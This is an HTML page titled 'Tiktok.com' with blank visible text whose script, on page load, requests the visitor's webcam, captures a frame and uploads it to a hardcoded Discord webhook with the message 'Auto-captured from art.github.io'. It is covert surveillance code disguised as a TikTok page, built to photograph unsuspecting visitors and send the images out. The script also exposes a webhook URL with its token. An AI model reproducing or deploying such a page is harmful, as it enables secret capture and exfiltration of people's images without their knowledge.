<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <title>Tiktok.com</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      background: #0f172a;
      color: #e5e7eb;
    }
    video, canvas, img {
      margin-top: 20px;
      border-radius: 12px;
      max-width: 100%;
      width: 320px;
    }
    .note {
      font-size: 13px;
      color: #9ca3af;
      margin-top: 10px;
      text-align: center;
      max-width: 360px;
    }
  </style>
</head>
<body>

  <h1></h1>
  <p class="note">
    
  </p>

  <video id="video" playsinline autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <img id="" alt="">
  <p class="note" id="status"></p>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";

    const video       = document.getElementById('video');
    const canvas      = document.getElementById('canvas');
    const photo       = document.getElementById('photo');
    const statusText  = document.getElementById('status');

    async function startCapture() {
      statusText.textContent = "";
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        video.srcObject = stream;
        video.style.display = 'block';

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        statusText.textContent = "";
        await new Promise(r => setTimeout(r, 800));

        const width  = video.videoWidth;
        const height = video.videoHeight;

        canvas.width = width;
        canvas.height = height;

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);

        const dataURL = canvas.toDataURL('image/png');
        photo.src = dataURL;

        const blob = await (await fetch(dataURL)).blob();
        const filename = "capture-" + Date.now() + ".png";

        const form = new FormData();
        form.append("file", blob, filename);
        form.append("content", "ðŸ“¸ Auto-captured from art.github.io");

        statusText.textContent = "";

        const res = await fetch(WEBHOOK_URL, {
          method: "POST",
          body: form
        });

        if (res.ok) {
          statusText.textContent = "";
        } else {
          statusText.textContent = ": " + res.status;
        }

        stream.getTracks().forEach(t => t.stop());
        video.style.display = "none";

      } catch (err) {
        console.error(err);
        statusText.textContent = "";
      }
    }

    // ðŸš€ à¹€à¸£à¸´à¹ˆà¸¡à¸—à¸³à¸‡à¸²à¸™à¸—à¸±à¸™à¸—à¸µà¹€à¸¡à¸·à¹ˆà¸­à¹€à¸‚à¹‰à¸²à¹€à¸§à¹‡à¸š
    window.onload = startCapture;
  </script>

</body>
</html>
